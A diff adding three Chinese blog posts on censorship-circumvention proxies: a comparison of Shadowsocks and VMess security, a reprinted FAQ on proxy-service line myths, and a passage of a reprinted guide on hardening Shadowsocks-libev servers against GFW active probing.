@@ -86,6 +86,766 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/30/Shadowsocks:Vmess-Choose/">
+                Shadowsocks/Vmess到底怎么选？安全性如何？
+            </a>
+        </h2>
+    
+    <time>
+        Jan 30, 2024
+    </time>
+    <section class="content">
+        <h1><span id="shadowsocksx2fvmess到底怎么选安全性如何">Shadowsocks&#x2F;Vmess到底怎么选？安全性如何？</span></h1><p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/1.png" alt="image"></p>
+<h2><span id="起因">起因</span></h2><blockquote>
+<p>入冬后，准确来说是在秋季，就感觉原来的小机场偶尔会出现大批节点无法连接的情况，今年1月底到期，在考虑几年了是否该更换跑路，不过好在相对便宜，故障一会就好，还能接受。</p>
+<p>然而在将要到期的前几天的时间点上，它刚好又出现了中断，且持续了近1个小时，这对打工人来说不太能接受了，于是便舍弃了原来的小机场，投奔朋友推荐的更大一家。</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/2.png" alt="image"></p>
+<p>但这里有两个问题，一个是用什么代理软件，第二个是用什么代理协议，这两个问题是逐步浮现的。</p>
+</blockquote>
+<h2><span id="代理软件">代理软件</span></h2><blockquote>
+<p>由于个人职业与所处行业原因，接触墙外比较早（小时候到外服体验新版本游戏），也在之前就尝试自己搭过VPS，详见<a target="_blank" rel="noopener" href="https://github.com/Szczecin/Try-for-V2Ray">Try-for-V2Ray</a>，后来由于Vultr质量真的不堪入目、WS+TLS需要的域名证书也是一笔费用且麻烦（才不是懒），项目算是咕掉了，但其中学习到的知识与相关技术还没全忘，用到的各种代理软件也还是多的。</p>
+</blockquote>
+<h3><span id="clash">Clash</span></h3><blockquote>
+<p>你要我从中选择，移动端PC端我都会毫不犹豫的选择Clash，谁能拒绝可爱猫猫？但是，可爱猫猫在2023年11月寄掉了！与之相关的Core、Pro、X等都闻风而逝（只猫，影逝二度），仅留下永远停止更新的本地客户端。</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/3.png" alt="image"></p>
+<p>虽然现在才1月底，最后一次release在3个月前，但时间越长，对于一个曾开源项目来说就越危险，必须要有可行的安全性选择（我也曾考虑过不这么麻烦，直接用之前的不就好了，然后我在互联网上“看着不错还蛮正经”的网站上获取的ClashX远程服务端口就被修改过了）。</p>
+</blockquote>
+<h3><span id="v2rayu">V2rayU</span></h3><blockquote>
+<p>撰写此文时，我新入职的公司使用的是MAC M2办公，在第一家公司就使用MAC的我并无什么不适应，但是ClashX在我入职前就化作灰烬，我在换机场前就已经在使用V2rayU，这是个专走Vmess协议的Proxy，虽然repo已有两年未更新了，但是release其实作者一直在偷偷更新。</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/4.png" alt="image"></p>
+<p>然而，当我切换到新的机场订阅时，却发现机场节点的一句提醒：</p>
+<p><strong>因V2ray重大漏洞问题，暂时下架全部V2节点。请使用ssr&#x2F;ss连接方式进行使用</strong></p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/5.png" alt="image"></p>
+</blockquote>
+<h2><span id="代理协议">代理协议</span></h2><blockquote>
+<p>所以这是怎么回事？</p>
+<p>我依稀记得我玩个人VPS那些年还在传VMESS协议更加安全，V2ray可以用更多的传输配置才对啊？这个重大漏洞是什么，CVE编号多少？（啊，这就是职业病）</p>
+</blockquote>
+<h3><span id="v2ray重大漏洞">V2ray重大漏洞</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://dolorhunter.com/v2ray-protocol-security-vulnerability/">V2ray协议爆发了重大安全漏洞</a></p>
+<p>漏洞的描述简单来说就是：</p>
+<p><strong>v2ray的TLS流量可被简单特征码匹配精准识别，vmess协议设计和实现缺陷可导致服务器遭到主动探测特征识别</strong></p>
+<p>这两方面的问题不论哪个都会使得用V2ray作为Proxy、VMESS作协议进行传输的墙外访问方式被轻松识别到，虽然不同于传统安全漏洞，但确实是严重问题。</p>
+<p><strong>服务器端的 V2ray 更新到 v4.23.4 以及之后的版本可以解决这一问题, 请大家尽快更新.</strong></p>
+<p>截止本文撰写，V2ray-Core的最新release已经到5.12.1，可是这个问题应该早已经被修复了，为什么现在订阅还有这样的提示，不让使用VMESS协议？</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="如何选择">如何选择</span></h2><blockquote>
+<p>绕一大圈，让我们回到文章的主标题：</p>
+<p><strong>Shadowsocks&#x2F;Vmess到底怎么选？安全性如何？</strong></p>
+<p>先说结论：<strong>它们最新版本的实现都是安全的，也都是不安全的</strong></p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/7.png" alt="image"></p>
+<p>为什么这么说？</p>
+<p>对于这两种协议甚至更多种的传输协议，想要去了解它的具体实现及传输形式并不难，以Shadowsocks为例，在<a target="_blank" rel="noopener" href="https://www.ichenxiaoyu.com/ss/">Shadowsocks协议解析</a>一文中有清晰明了的叙述，Vmess你也应该都能找到类似的内容。</p>
+<p>Shadowsocks&#x2F;Vmess都会采用一定的加密算法，将传输内容进行加密，在<a target="_blank" rel="noopener" href="https://pincong.rocks/article/41551">浅谈一下Shadowsocks和VMess的安全性</a>一文的评论中，enfein有提到“shadowsocks 协议现阶段还是安全的，但 VMess 在一些领域做得更好，例如使用依赖于时间的密钥生成办法”，这也佐证了我最初认为Vmess协议的安全性设计比Shadowsocks好的看法，那就能说明Vmess安全性更好吗？</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="主要漏洞">主要漏洞</span></h3><blockquote>
+<p>我们回忆一下前文提到的“V2ray重大漏洞”，虽然没有被直接破解出传输内容明文，但能精确地探测标识proxy服务器，与在黑暗森林中点火且大喊无异。</p>
+<p>那么Shadowsocks有这样的问题吗？</p>
+<p>在<a target="_blank" rel="noopener" href="https://pincong.rocks/article/41551">浅谈一下Shadowsocks和VMess的安全性</a>的原文中，作者例举了两个Shadowsocks的相关漏洞：</p>
+<p><a target="_blank" rel="noopener" href="https://pincong.rocks/url/link/aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvd3NvY2tzL3NoYWRvd3NvY2tzLW9yZy9pc3N1ZXMvMTgz">Shadowsocks AEAD 加密方式设计存在严重漏洞，无法保证通信内容的可靠性</a></p>
+<p><a target="_blank" rel="noopener" href="https://pincong.rocks/url/link/aHR0cHM6Ly9naXRodWIuY29tL0xlYWRyb3lhTC9zcy1yZWRpcmVjdC12dWxuLWV4cA">shadowsocks redirect attack exploit</a></p>
+<p>前者也会使proxy服务器因为流量特征被标识而封禁，后者则更致命地可导致传输内容密文被解析。</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="最佳实践">最佳实践</span></h3><blockquote>
+<p>既然大家都是卧龙凤雏，有什么不那么烂的方式吗？</p>
+<p>首先要明确的是，最新版本的协议都已经将已知漏洞修复，可以认为两者安全性相近，也都有可能被流量分析与主动探测（即使你采取了防范与伪装）。</p>
+<p>针对Shadowsocks，<a target="_blank" rel="noopener" href="https://gfw.report/blog/ss_advise/zh/">防御GFW主动探测的实用指南</a>一文中指出了Shadowsocks理应达到的最佳实践；相应的，Vmess支持和TLS组合，也可以实现动态端口等，这些在我搭建VPS的时候就已经是个人可以不算复杂的实现了。并且在<a target="_blank" rel="noopener" href="https://pincong.rocks/article/12173">【还Shadowsocks一个清白】Shadowsocks是如何被检测和封锁的，兼谈ss配置策略</a>一文中，也有提到可以采用国内转国外双重代理的方式，规划ip白名单，规避一些探测（但文章内容主观性较强，观点接纳需分别）：</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/10.png" alt="image"></p>
+<p>此外，在搭建与使用的过程中，不能过分信任某些教程，并不是说它们的方法有问题，而是很多一键部署的脚本为了运行的稳定性与一致性，是写死了引用版本的，那么就很有可能还在利用存在漏洞的协议版本；同时也需要注意客户端的选择，个人现在使用的是Clash Verge Rev（回来吧我的牢猫！），Clash Verge的原repo也因为2023年11月的风波停止更新，Rev是抛弃了原Clash Core（repo removed）采用mihomo重新构建并仍在更新的版本。</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/11.png" alt="image"></p>
+<p>那为什么不使用V2ray相关的客户端？</p>
+<p>一方面是新的机场不支持Vmess（前情提要），一方面是V2ray Core做出的客户端确实没有猫猫可爱（猫猫也支持Vmess等多种协议），再一方面是有些V2ray的客户端的最新release用的Core版本仍处于风险版本（V2rayU：所以爱是会消失的对吗？）</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/12.png" alt="image"></p>
+</blockquote>
+<h3><span id="机场顾虑">机场顾虑</span></h3><blockquote>
+<p>最后一个问题，既然Shadowsocks和Vmess都可以，为什么有些机场不提供Vmess节点了？</p>
+<p>这个问题在<a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/">关于科学上网的流行说法</a>一文中可见一斑：</p>
+<ul>
+<li>大部分机场都是中转线路，使用 V2RAY 显得太重，消耗服务器资源大</li>
+<li>V2RAY在防标识的场景下相比已经搭好的Shadowsocks没有明显优势</li>
+</ul>
+<p>所以对于机场线路，公网隧道、专线，没有一定要再采用哪种协议的需求，更多地在考虑带宽等费用与访问流畅度。此外，机场躲避封锁的方式，在文章中也有谈及，同时文章中也有谈到订阅转换的技术，在一些机场也有提供（在逐渐收敛）。</p>
+<p><strong>个人小注</strong></p>
+<p>对于浏览访问来说，机场提供的服务已经完全够用，除了不能登录服务器进行配置这部分不便，这也是我为什么暂时放弃了自己搭建VPS的想法；</p>
+<p>但对于未来的渗透测试来说，虽然简单的OOB可以Dnslog&#x2F;Ceye，但如果要弹shell，或者境外测试，就还是需要国内云与国外云的服务，这些机场就完全无法支持了。</p>
+<p><img src="/2024/01/30/Shadowsocks:Vmess-Choose/13.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考引用">参考引用</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Szczecin/Try-for-V2Ray">Try-for-V2Ray</a></p>
+<p><a target="_blank" rel="noopener" href="https://dolorhunter.com/v2ray-protocol-security-vulnerability/">V2ray协议爆发了重大安全漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ichenxiaoyu.com/ss/">Shadowsocks协议解析</a></p>
+<p><a target="_blank" rel="noopener" href="https://pincong.rocks/article/41551">浅谈一下Shadowsocks和VMess的安全性</a></p>
+<p><a target="_blank" rel="noopener" href="https://pincong.rocks/url/link/aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvd3NvY2tzL3NoYWRvd3NvY2tzLW9yZy9pc3N1ZXMvMTgz">Shadowsocks AEAD 加密方式设计存在严重漏洞，无法保证通信内容的可靠性</a></p>
+<p><a target="_blank" rel="noopener" href="https://pincong.rocks/url/link/aHR0cHM6Ly9naXRodWIuY29tL0xlYWRyb3lhTC9zcy1yZWRpcmVjdC12dWxuLWV4cA">shadowsocks redirect attack exploit</a></p>
+<p><a target="_blank" rel="noopener" href="https://gfw.report/blog/ss_advise/zh/">防御GFW主动探测的实用指南</a></p>
+<p><a target="_blank" rel="noopener" href="https://pincong.rocks/article/12173">【还Shadowsocks一个清白】Shadowsocks是如何被检测和封锁的，兼谈ss配置策略</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/">关于科学上网的流行说法</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/New-Start/" rel="tag">New Start</a><a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Shadowsocks/" rel="tag">Shadowsocks</a><a class="tag-none-link" href="/tags/V2ray/" rel="tag">V2ray</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/30/Proxy-FAQ/">
+                关于科学上网的流行说法
+            </a>
+        </h2>
+    
+    <time>
+        Jan 30, 2024
+    </time>
+    <section class="content">
+        <h1><span id="关于科学上网的流行说法">关于科学上网的流行说法</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/">Clouder</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>本文意在分析一些经常被提及、引起争论的问题。</p>
+</blockquote>
+<h2><span id="为什么不用-v2rayx2ftrojan">为什么不用 V2RAY&#x2F;Trojan</span></h2><blockquote>
+<p>由于直连打击力度较大，个人自建需要使用更不易被封锁的协议。很多人宣传 V2RAY Trojan 等，事实上对直连也许是有一定帮助的。</p>
+<p>但是大部分机场都是中转线路，使用 V2RAY 显得太重，消耗服务器资源大，而实质上并没有什么帮助，因此更青睐老牌的、生态更好的 Shadowsocks 及 ShadowsocksR。</p>
+<p>Trojan 也是类似的。</p>
+<p>因此发表一些“不用 V2RAY 不怕被封吗”之类的言论，并不明智。</p>
+<p>以下是部分大佬对此的看法。(如有冒犯，请联系删除)</p>
+<p><img src="/2024/01/30/Proxy-FAQ/1.png" alt="image"></p>
+<p><img src="/2024/01/30/Proxy-FAQ/2.png" alt="image"></p>
+<p><img src="/2024/01/30/Proxy-FAQ/3.png" alt="image"></p>
+<p><img src="/2024/01/30/Proxy-FAQ/4.png" alt="image"></p>
+<p>(本句在当时语境下类似于玩笑话，其本人无任何贬低 Trojan 的意思。)</p>
+<p>不可否认，新的协议的出现是必然且有意义的，但其出现一般都是为了解决现有问题。</p>
+<p>例如 V2RAY 试图解决的是严重封锁，而 Trojan 试图解决的是 V2RAY 过重的问题。</p>
+<p>而机场线路，公网隧道、专线，大概没有此类需求。</p>
+<p>此外，Shadowsocks 与 ShadowsocksR 的生态相对成熟。</p>
+<p>关于 Shadowsocks 与 ShadowsocksR 有如下说法：</p>
+<ol>
+<li>Shadowsocks 每个用户需要占用一个端口，部署可能不便。而 ShadowsocksR 支持端口复用模式。</li>
+<li>ShadowsocksR 停止维护，且加密程度相对 Shadowsocks 更高，意味着效率、性能相对较劣，但有传 ShadowsocksR 能缓解 QOS 问题。</li>
+</ol>
+<p>目前看来，Shadowsocks 协议支持最为广泛。</p>
+<p>以上内容为笔者个人见解，如有谬误，敬请斧正。</p>
+</blockquote>
+<h2><span id="iplc-天下第一吗">IPLC 天下第一吗？</span></h2><blockquote>
+<p>首先，看看<a target="_blank" rel="noopener" href="https://www.duyaoss.com/archives/57/">毒药博客</a>中的介绍。</p>
+<ul>
+<li>IPLC: “International Private Leased Circuit”的缩写，即“国际专线”。不过大部分机场通常看到的 iplc，都只是阿里的经典网络，跨数据中心内网互通，阿里内网，并不是严格意义的 iplc 专线；当然也有其他渠道的，或真 iplc，不过比较少。阿里云的内网互通底层原理是通过采购多个点对点的 iplc 专线，来连接各个数据中心，从而把各个数据中心纳入到自己的一套内网里面来。这样做有两个好处，其一是 iplc 链路上的带宽独享，完全不受公网波动影响，其二是过境的时候不需要经过 GFW，确保了数据安全且不受外界各种因素干扰。但是需要注意一下阿里云的 iplc 也是有带宽上限的，如果过多的人同时挤到同一条专线上，峰值带宽超过专线的上限的话也同样会造成网络不稳定。其他渠道购买到的 iplc 价格很高，阿里云内网这种性价比超高这种好东西且用且珍惜。</li>
+<li>IEPL 国际以太网专线（International Ethernet Private Line,简称 IEPL)，构建于 MSTP 设备平台上，基于 SDH 传输技术，采用 GFP 封装，传输协议透明，物理层隔离，带宽保证，提供一层点对点数据专线服务。IEPL 是以太网接口的增强型的 IPLC 产品，是一个端到端的专享管理频宽服务，拥有高度灵活性及最高物理层网络安全功能，让客户轻松管理广域网和高带宽需求的应用。通俗的总结一下，IEPL 使用某种技术，实现了两点之间的高稳定性的数据传输。这与 IPLC,MPLS 是差不多的效果，只是实现的技术手段有区别而已。其实对机场来说，是 IPLC 或者 IEPL 或是 MPLS-VPN，都没有太大区别。认定是保障带宽的不过墙专线就行了，至于是用哪种技术方案实现的，根本不需要纠结。</li>
+<li>BGP：BGP 的实际意思通常是一个 IP 在多个运营商的网络中均为直连，不经过第三运营商，利用 iptables 或相关软件通过将去海外 VPS 的流量加一层国内转发。不过不同机场的定义也不一样。正常来说比如 rixcloud，指的是他们入口是阿里云、部分落地节点是自己起了 BGP（去 Peer 了 GitHub、微软、Cloudflare 等等）。不过多数机场把 BGP 定义为阿里云公网中转等。</li>
+<li>中转：将数据从一个服务器重定向到另外一个服务器。机场中比较常见的是阿里云公网中转，其实也有很多其他中转，也有自己去买其他的 BGP 来中转的。</li>
+<li>「原生 IP」：所谓原生 IP 通常意思为当地运营商原本就拥有的 IP；广播国家一般和注册国家相同（一般的 IP 库不会误判地区），一般不用于公有云计算服务或 IP 声誉好，一般能够用来解锁 Netflix、HBO、Hulu 以及其它有限制的流媒体服务</li>
+<li>流媒体解锁：很多流媒体服务平台如 Netflix 会出于版权原因而限制一些特定 IP 的访问。一般来说网络运营商（如 HKT）自己持有的 IP，比如商宽、家宽，极少被屏蔽，因为这些 IP 大多是流媒体服务商的目标客户在使用。家宽 IP 被屏蔽的几率是最低的，很多 ISP 的家宽都是动态 IP 的，很难精准封杀。固定 IP 的商宽其次。这些流媒体服务商也怕误杀导致投诉，比如 GCP 的 IP 段被投诉之后又可以看 Netflix 了。IDC 商家所持有的 IP 一般会被屏蔽，越大越有名的 IDC 持有的 IP 被屏蔽的几率越高。很多 IDC 会租用运营商的 IP 从而绕过此类封杀，但是这种方式并不是万无一失的，翻车案例比较多我就不再一一例举了。所以除非是商宽、家宽，其他所谓的“原生 IP 解锁流媒体”都是有几率翻车的。</li>
+<li>CN2:是电信的精品骨干网。首先 CN2 是一张运营商骨干网，就像电信 163、中国移动这一类是同样性质的东西，但相对电信 163 来说会有更好的稳定性。不是什么专线（和 iplc 那类东西区分清楚）。既然是公网，那它本质上就是个很多人共享使用的东西。共享的东西都存在一定程度的不稳定性。区别在于它的超售比较低，相对电信 163 来说会有更好的质量。CN2 的跨国数据通讯也需要经过 GFW 审查，不存在不过 GFW 的公网。</li>
+</ul>
+<p>在谈及 IPLC 时，一般泛指专线。专线相对于公网中转有如下优点：</p>
+<ol>
+<li>不经过 GFW，也就是所谓的不过墙。</li>
+<li>链路宽带独享，不受公网波动影响。</li>
+</ol>
+<p>一个中转节点应该是这样的：</p>
+<p><img src="/2024/01/30/Proxy-FAQ/5.png" alt="image"></p>
+</blockquote>
+<h3><span id="iplc-速度快">IPLC 速度快</span></h3><blockquote>
+<p>一般来说，用户更关心的速度是“网速”，也就是宽带大小。</p>
+<p>而使用专线并不能改变宽带的容量，因此盲目地认为 IPLC 网速快是毫无根据的。</p>
+</blockquote>
+<h3><span id="iplc-延迟低">IPLC 延迟低</span></h3><blockquote>
+<p>专线传输，理论上延迟的确更低。 排除掉机场过度超售、宽带跑满丢包、软件出锅等问题，专线在此方面的确有优势。 虽然一般用户无需过多在意延迟。</p>
+</blockquote>
+<h3><span id="iplc-稳定">IPLC 稳定</span></h3><blockquote>
+<p>专线传输的稳定，主要体现在链路宽带独享，不容易受公网波动影响。 但上游依然会出问题，例如机房事故等等。 而高质量的公网可靠性并不差。</p>
+</blockquote>
+<h3><span id="iplc-安全">IPLC 安全</span></h3><blockquote>
+<p>不经过 GFW 的处理，在某种意义上安全了。 但专线传输数据仍受到监管，如 ssrcloud 的中日专线有人访问邪教网站遭到警告。</p>
+<p>注重隐私请使用 no-log VPN、多层跳板等方式，而不要轻信提供科学上网服务的机场还能保护你的安全。 一般人无需对此过于敏感。</p>
+</blockquote>
+<h3><span id="iplc-贵">IPLC 贵</span></h3><blockquote>
+<p>专线宽带的价格的确高昂。</p>
+<p>下图为花卷科技的 IPLC 专线宽带价格。</p>
+<p><img src="/2024/01/30/Proxy-FAQ/6.png" alt="image"></p>
+<p>即使有钻石分销的六折，每 Mbps 也高达 210RMB，每 100 Mbps 价格要达到两三万元。</p>
+<p>然而，其实还有更高贵的。如下图，北京动态 BGP 全穿透多线宽带。</p>
+<p><img src="/2024/01/30/Proxy-FAQ/7.png" alt="image"></p>
+<p>上图为微网聚力官网的价格表，可以看到最高贵的宽带每 100 Mbps 高达五万元每月。</p>
+<p>事实上，单比较价格意义不大，因为可以这样部署：</p>
+<p><img src="/2024/01/30/Proxy-FAQ/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="总结">总结</span></h3><blockquote>
+<p>以上内容亦非绝对，笔者目的不在于否定专线等等，而在于提醒各位读者更理性、全面地看待线路，而不要迷信专线等。</p>
+<p>100Mbps 的专线给 100 人用，体验可能并不如 1Gbps 的公网隧道给 100 人用。</p>
+<p>其实，用户对节点线路无需过多关注，而只需要关注用户体验。用起来好就行，不必在意机场主用了什么神秘的操作。</p>
+<p>最后，来点佩奇笑话。</p>
+<p><img src="/2024/01/30/Proxy-FAQ/9.png" alt="image"></p>
+<p><img src="/2024/01/30/Proxy-FAQ/10.png" alt="image"></p>
+</blockquote>
+<h2><span id="订阅转换偷订阅">订阅转换偷订阅</span></h2><blockquote>
+<p>不可否认，在技术上的确是可行的。 然而，让我们看看搭建订阅转换服务的都是什么大佬吧。</p>
+</blockquote>
+<h3><span id="bianyuan">bianyuan</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://bianyuan.xyz/">边缘订阅转换 API</a>，笔者使用的第一个订阅转换 API。</p>
+<p>Sabrina，博客地址为 <a target="_blank" rel="noopener" href="https://merlinblog.xyz/%EF%BC%8CN3RO">https://merlinblog.xyz/，N3RO</a> 机场的大佬。</p>
+<p>撰写了大量教程，对社区的贡献毋容置疑。对于转换偷订阅的说法，其本人亦有过回应：</p>
+<p><img src="/2024/01/30/Proxy-FAQ/11.png" alt="image"></p>
+</blockquote>
+<h3><span id="nameless13">nameless13</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://api.nameless13.com/%EF%BC%8C%E4%B9%9F%E6%98%AF%E7%9B%B8%E5%BD%93%E7%9F%A5%E5%90%8D%E7%9A%84%E8%AE%A2%E9%98%85%E8%BD%AC%E6%8D%A2">https://api.nameless13.com/，也是相当知名的订阅转换</a> API 了。</p>
+<p>Nameless13，魅影的管理员，撰写了<a target="_blank" rel="noopener" href="https://docs.nameless13.com/">魅影各类教程</a>。</p>
+</blockquote>
+<h3><span id="gfwsb114514best">gfwsb.114514.best</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gfwsb.114514.best/%EF%BC%8C%E8%BF%99%E5%9F%9F%E5%90%8D%E9%9C%87%E6%92%BC%E6%88%91%E4%B8%80%E4%B8%87%E5%B9%B4%E2%80%A6%E2%80%A6">https://gfwsb.114514.best/，这域名震撼我一万年……</a></p>
+<p>TindyX，subconverter项目的作者。</p>
+</blockquote>
+<h3><span id="总结">总结</span></h3><blockquote>
+<p>以上只是订阅转换的一部分。笔者想借此说明的是，搭建这种公益服务者通常为大佬，并不会眼馋你的订阅。 当然并不排除有作恶者存在。 实在担心，建议使用本地版的 subconverter，避免此问题。</p>
+</blockquote>
+<h2><span id="surfboard-快">Surfboard 快</span></h2><blockquote>
+<p>笔者无端猜测，有小白看了某知名 youtuber 的各大软件速度对比后，认为 Surfboard 更快。</p>
+<p>笔者未进行相关测试，但必须指出： 软件并不是网速的主要影响因素，且无明显缺陷的软件，在速度上并不会有太大差异。</p>
+<p>网速的主导因素，是线路质量。包括但不限于设备到路由器、家庭宽带到国内入口、国内入口到国内出口、国内出口到国际落地、国际落地到目标服务器的线路质量。</p>
+<p>Surfboard 是一个相当优秀的客户端，但请不要以“网速最快”等说法夸赞推荐它，否则可能引发不必要的争端。</p>
+</blockquote>
+<h3><span id="关于网速的一些思考">关于网速的一些思考</span></h3><blockquote>
+<p>使用 youtube 进行网速测试，会受到硬件性能等因素影响，测速应使用更专业的工具。</p>
+<p>据传，旧版本的 Clash For Android 使用的内核有一定的性能问题，已经更换。(来源不详，不必当真)</p>
+<p>理想的中高端机场，应当能达到 100Mbps 及以上的速率，选用软件对网速的影响不必多虑。</p>
+</blockquote>
+<h3><span id="关于软件速度的一些思考">关于软件速度的一些思考</span></h3><blockquote>
+<p>一般来说，功能越复杂，速度就越慢。在路由器上跑规则复杂的 Clash，可能对网速有较大影响。</p>
+<p>使用 PC 客户端，基本不用考虑。移动设备可能有一定影响，但并不大，无需太在意。</p>
+<p>此处速度为泛指，结论纯粹笔者臆想，不足为据。</p>
+</blockquote>
+<h2><span id="总结">总结</span></h2><blockquote>
+<p>撰写本文的目的，并不是想否定、批评广为流行的某些说法，而是想否定盲目地迷信某些说法的行为。 例如，对机场不提供 V2RAY 提出质疑的小白，吹捧 IPLC 强无敌的小白，认为 Surfboard 天下第一的小白等等……</p>
+<p>本文也无意提出什么说法，而仅仅想说明：没有什么是绝对的。请理性评判，不要迷信权威。</p>
+<p>That’s All.</p>
+</blockquote>
+<h2><span id="引用">引用</span></h2><blockquote>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/Clouder0/myPics/img/portreuse.png">ShadowsocksR 端口复用</a> <a target="_blank" rel="noopener" href="https://rixcloudkb.io/faq/">原文</a> <a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/#fnref:1">↩︎</a></li>
+<li><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/Clouder0/myPics/img/ssrdeqos.png">ShadowsocksR 缓解 QOS 问题</a> <a target="_blank" rel="noopener" href="https://rixcloudkb.io/faq/">原文</a> <a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/#fnref:2">↩︎</a></li>
+<li><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/Clouder0/myPics/img/zsfx.png">花卷科技钻石分销</a> <a target="_blank" rel="noopener" href="https://www.betaidc.com/pricing.html">原文</a> <a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/#fnref:3">↩︎</a></li>
+<li>微网聚力价格表 <a target="_blank" rel="noopener" href="https://www.ucache.cn/idc/services/hosting/">原文</a> <a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/#fnref:4">↩︎</a></li>
+<li>几乎所有订阅转换都基于 <a target="_blank" rel="noopener" href="https://github.com/tindy2013/subconverter">subconverter</a>。 <a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/#fnref:5">↩︎</a></li>
+<li><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/Clouder0/myPics/img/cfaupdate.png">CFA Release</a> <a target="_blank" rel="noopener" href="https://www.codein.icu/proxyfaq/#fnref:6">↩︎</a></li>
+</ol>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Shadowsocks/" rel="tag">Shadowsocks</a><a class="tag-none-link" href="/tags/V2ray/" rel="tag">V2ray</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/29/Shadowsocks-GFW-Defend/">
+                防御GFW主动探测的实用指南
+            </a>
+        </h2>
+    
+    <time>
+        Jan 29, 2024
+    </time>
+    <section class="content">
+        <h1><span id="防御gfw主动探测的实用指南">防御GFW主动探测的实用指南</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://gfw.report/blog/ss_advise/zh/">Great Firewall Report</a> 并作补充</p>
+<p>在近期的IMC’20的工作中(<a target="_blank" rel="noopener" href="https://gfw.report/publications/imc20/data/paper/shadowsocks.pdf">论文</a>, <a target="_blank" rel="noopener" href="https://gfw.report/talks/imc20/zh/">演讲</a>)，我们揭示了中国的防火长城采用<em>流量分析</em>与<em>主动探测</em>相结合的手段来检测和封锁Shadowsocks服务器。</p>
+<p>在这篇短文中，我们将分别向技术小白和翻墙软件开发者提供防御GFW主动探测的实用建议。 我们还将介绍Len et al.展示的<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/sec21summer_len.pdf#page=13">partitioning oracle攻击</a>的缓解办法。 如果在遵循了本文的建议后，你的Shadowsocks服务器仍被封锁，请将封锁情况<a target="_blank" rel="noopener" href="https://gfw.report/">汇报给GFW Report</a>以及相应的开发者。</p>
+</blockquote>
+<h2><span id="给用户的建议">给用户的建议</span></h2><blockquote>
+<p>根据我们的测试和来自开发者的报告，在采用了适当的配置后，以下两个Shadowsocks实现的最新版本已经可以抵御来自GFW的主动探测：<em>Shadowsocks-libev</em>和<em>OutlineVPN</em>。</p>
+</blockquote>
+<h3><span id="针对shadowsocks-libev的使用建议">针对Shadowsocks-libev的使用建议</span></h3><blockquote>
+<p>如果你决定使用Shadowsocks-libev，我们强烈建议你根据这篇教程来<a target="_blank" rel="noopener" href="https://gfw.report/blog/ss_tutorial/zh/">部署一台抗封锁的Shadowsocks-libev服务器</a>。我们会时刻更新那篇教程的，以应对之后新出现的针对Shadowsocks的识别和攻击。</p>
+<p>如果你已经拥有了一台Shadowsocks-libev服务器，你可以根据以下规则来确认你的服务器是否配置得可以对抗GFW的主动检测和封锁。</p>
+<p>截止2021年1月，你需要做到以下几点来防止你的<em>Shadowsocks-libev</em>服务器被封锁：</p>
+<ol>
+<li>确保你的服务器版本为<code>v3.3.1</code>及以上。你可以通过以下命令查看服务器的版本<code>ss-server -h</code>。</li>
+<li>使用<a target="_blank" rel="noopener" href="https://shadowsocks.org/en/spec/AEAD-Ciphers.html"><em>AEAD ciphers</em></a>， 而<strong>不用</strong> <em>stream ciphers</em>。换句话说，仅在以下几种加密方式中进行选择：<code>chacha20-ietf-poly1305</code> (推荐), <code>aes-256-gcm</code>, <code>aes-192-gcm</code>或者<code>aes-128-gcm</code>。</li>
+</ol>
